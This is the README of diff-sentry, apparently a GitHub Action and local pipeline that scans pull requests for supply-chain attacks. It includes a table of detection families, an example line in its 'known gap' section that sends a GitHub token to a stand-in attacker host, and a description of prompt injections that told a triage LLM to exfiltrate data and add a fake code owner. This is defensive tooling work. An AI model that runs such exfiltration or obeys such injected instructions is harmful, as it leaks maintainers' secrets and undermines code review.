# diff-sentry

**Catch a malicious pull request before you merge it.**

diff-sentry reads a change the way an attacker hopes you won't: it treats the diff as untrusted data,
looks for the shapes that real supply-chain attacks use, and reports evidence rather than an opinion.

The fastest way to use it is as a GitHub Action. It needs no API key, no model, and no network access,
so it runs on fork pull requests under the read-only token they already get.

```yaml
# .github/workflows/diff-sentry.yml
name: diff-sentry
on: pull_request

permissions:
  contents: read

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0          # the scan diffs against the PR base
      - uses: qazbnm456/diff-sentry@main
```

That is the whole setup. The job fails when an indicator at or above `high` fires. Pin to a released
tag rather than `main` once you depend on it.

## What it catches

| Family | Examples |
|---|---|
| Workflow configuration | `pull_request_target` that checks out the PR head (the pwn-request that broke AsyncAPI), `permissions: write-all`, CODEOWNERS reassignment |
| Obfuscation | base64 that decodes to a shell payload, `_0x…` machine-mangled JavaScript, high-entropy blobs |
| Execution | pipe-to-shell installs, `${IFS}` space-evasion, detached child processes, inline `node -e`, fetch-to-disk droppers |
| Exfiltration | secrets reaching a network sink, cross-process `/proc/<pid>/mem` reads, OAST callback services, IPFS and permaweb gateways |
| Diff-presentation evasion | payloads shoved past the viewport by a long whitespace run, bidi-override and zero-width characters |
| Provenance | forged `[bot]` identities, bot-mimicking new accounts, unsigned or identity-mismatched commits |
| Prompt injection | instructions aimed at an LLM reviewer or triage workflow |

**Severities are tuned, not maximal.** A plain workflow-file edit is `medium`, below the failure
threshold, on purpose: a benign workflow PR must not break your build. A `pull_request_target` on its own
is `medium` too, because that is the ordinary label-bot shape. It becomes `critical` only when the same
workflow also checks out the PR head. Rules that would be noisy alone require two halves to fire:
`child_process` is everywhere and `detached` alone means nothing, but a process deliberately outliving
its parent is a loader.

A diff carries deleted code as well as added code, so the scan skips `-` lines by default. Removing a
payload does not flag the change that removes it.

### Inputs

| Input | Default | Purpose |
|---|---|---|
| `fail-on` | `high` | Severity that fails the build (`info`/`low`/`medium`/`high`/`critical`). |
| `report-only-paths` | none | Newline-separated globs scanned but never gated. For files whose job is to carry attack patterns: rule bodies, security fixtures, prompt templates, docs that tabulate payloads. |
| `base-sha` | derived | Override the commit to diff against. |
| `version` | `main` | The diff-sentry ref to run. Pin it for reproducible CI. `local` installs from the current checkout, which is how this repo scans its own PRs with the rules in that PR. |

Outputs: `failed`, `hit-count`, `max-severity`, and `report` (a JSON path).

### Do not reach for `pull_request_target`

Sooner or later you will want the scan to post its results as a PR comment, and a `pull_request` job on
a fork PR has a read-only token. The tempting fix is `pull_request_target`, which is the exact
misconfiguration that opened the AsyncAPI "Miasma" compromise, and which this action reports as
`critical`.

Do it the safe way instead: keep the scan on `pull_request` with no secrets, upload the `report` as an
artifact, and post it from a separate `workflow_run` job that runs the base branch's code and never
checks out the PR head. diff-sentry's own rules make the same distinction, so the safe shape does not
trip them.

## Evidence a model cannot suppress

An LLM reviewer that reads a diff can be argued out of its conclusion by that same diff. diff-sentry is
built so that cannot hide anything.

The deterministic rules run host-side, before any model takes a turn, and their hits are recorded as
facts. When a verdict is assembled, the evidence is re-sourced as the union of every recorded hit, and
the alert decision is derived from that union rather than from the model's self-report. A successful
prompt injection can skew the *verdict*; it cannot remove a single piece of *evidence*. In the Action,
that is the whole product: no model runs at all.

## Beyond CI: the full detection workflow

The Action is one entry point into a larger system. If you operate the infrastructure, or maintain a
project where a wrong call is expensive, the rest is available locally.

https://github.com/user-attachments/assets/d200aee8-263b-483e-ad55-f90ae69f3ab0

_The studio console: paste a real payload, watch the detection stream live, then read the evidence-framed
verdict._

```
GitHub PR/issue/push  →  normalize (metadata head+tail)  →  classify (diff held in a sandboxed REPL)
                      →  judgement-only verdict  →  UNION deterministic indicators on read  →  SIEM signal
                      →  reward-free trajectory export
```

**Deep classification.** The full pipeline hands the change to a reasoning model that explores it inside
a sandboxed Python REPL: decode a base64 filename, inspect the raw file list, re-scan a decoded region.
The change is a variable under analysis, never text spliced into instructions. The model submits a
judgement only. It has no field in which to write, hide, or invent evidence.

**The studio console.** A local web console that streams a run as it happens: each iteration, each tool
call, the indicators as they fire, and the assembled verdict with its evidence. Useful when you are
tuning rules or explaining a call to someone who has to act on it.

**Trajectories for training.** Every run records a full trace, and `export` turns a directory of traces
into a reward-free dataset: the planner's actions, the classifier's calls, and objective labels read
back from the assembled verdict. The intended use is fine-tuning a smaller model for the planner role
(`DS_ROOT_LM`) on your own traffic, so the deep tier gets cheaper the longer you run it. Scoring and
credit assignment deliberately live outside this repo; what ships here is the rollout source.

**A reward-free scorecard.** The [`eval/`](eval/README.md) workspace member scores a recorded run's
assembled verdict with an independent LLM judge across four categories, means only, no composite and no
threshold. It reads the trace contract one-way and never feeds training.

```bash
uv sync --group dev
uv run pytest                                   # offline suite: no live model, no network, no Deno

uv run diff-sentry scan changes.diff            # the deterministic layer alone (what the Action runs)
uv run diff-sentry pr acme/widgets 7            # full classification (needs DS_* creds, deno, gh)
uv run diff-sentry issue acme/widgets 12
uv run diff-sentry classify event.json          # a payload you already hold
uv run diff-sentry render output/traces/pr-7.jsonl pr-7      # re-derive a response, offline
uv run diff-sentry export "output/traces/*.jsonl" ds.json    # reward-free dataset, offline
```

Models are roles, set by environment: `DS_ROOT_LM` (planner), `DS_SUB_LM` (analyst), `DS_CLASSIFIER_LM`
(second-stage classifier). Point them at any OpenAI-compatible endpoint; see
[`.env.example`](.env.example). The planner and analyst can also run on a **Claude Pro/Max subscription**
by giving either role a `claude-agent-sdk/<model>` value with the `subscription` extra installed. The
classifier always needs its own endpoint.

None of this is required to use the Action, and none of it sends your code anywhere you did not
configure yourself.

## Honest limits

**Prompt injection.** diff-sentry detects prompt injection, so it has to resist it. In the full
pipeline the untrusted change is a REPL variable rather than prompt text, a mission frame reframes any
embedded instruction as a signal rather than a command, and the normalizer denies the attacker the
preview window's edges. The residual is real: a bounded preview of the input still reaches the prompt,
so a strong injection can skew the verdict. It cannot suppress the evidence. The Action is not exposed
to this at all, because no model runs.

**Throughput.** A full model-driven episode takes seconds to minutes and costs real money per change.
diff-sentry is the deep-analysis tier, not the firehose. The Action's deterministic scan is the cheap
tier and is meant to run on everything; escalate only what it flags.

**A known gap in the deterministic layer.** A secret read that reaches a JavaScript network sink across
lines (`const t = process.env.GITHUB_TOKEN;` … `fetch('https://attacker.tld', {body: t})`) does not
fire, because the exfiltration rule needs the secret and the sink within 80 characters on one line. The
fix we evaluated (taint tracking from the assignment to the sink, suppressed for first-party hosts)
measured zero false positives on our corpus and full history, but it still cannot separate a token
being stolen from one legitimately posted to a third-party service, so it is not shipped rather than
shipped noisy. Note the `pwn-request` rule does not cover this: it fires when a privileged workflow is
*introduced*, not when a pre-existing one is *exploited*.

## Grounded in real incidents

The detection families are not hypothetical. Two incidents are reconstructed offline and pinned by
tests, so a rule change that breaks coverage fails the build.

**`hackerbot-claw`** (Datadog's [BewAIre writeup](https://www.datadoghq.com/blog/engineering/stopping-hackerbot-claw-with-bewaire/)).
The original artifacts are gone, the attacker account was deleted, so
`tests/corpus/hackerbot_claw_incident.json` reconstructs all three events: a `${IFS}`/base64 payload
hidden in a *filename* under `documentation/rules/` that de-obfuscates to a published pipe-to-shell IOC,
a prompt injection telling a triage LLM to bulk-label and exfiltrate, and a prompt injection appending a
fake owner to CODEOWNERS. Each is asserted under a neutral benign verdict, so the alert is
evidence-driven: a false-benign self-report could not have suppressed any of them.

**AsyncAPI "Miasma"**. Reconstructing that chain stage by stage found seven of its eight stages passing
our rules silently, because the suite was shell- and YAML-shaped while the attack was Node end to end.
The rules that closed the gap ship with their negative cases, so the tuning is pinned as tightly as the
detection.

## Development

The offline suite covers the pipeline with no live model, no network, and no Deno; the corpus pins the
rules' hit and miss behavior; the eval member has its own suite.

```bash
uv run pytest                                                     # core
uv run --package diff-sentry-eval --extra dev python -m pytest eval/tests
uvx ruff@0.16.0 check .
```

CI runs the published Action against this repository's own pull requests (`uses: ./`), so a change that
breaks the Action fails here before it reaches anyone's install.

Detection engine and RLM harness: [`rlm-harness`](https://github.com/qazbnm456/rlm-harness).

MIT.
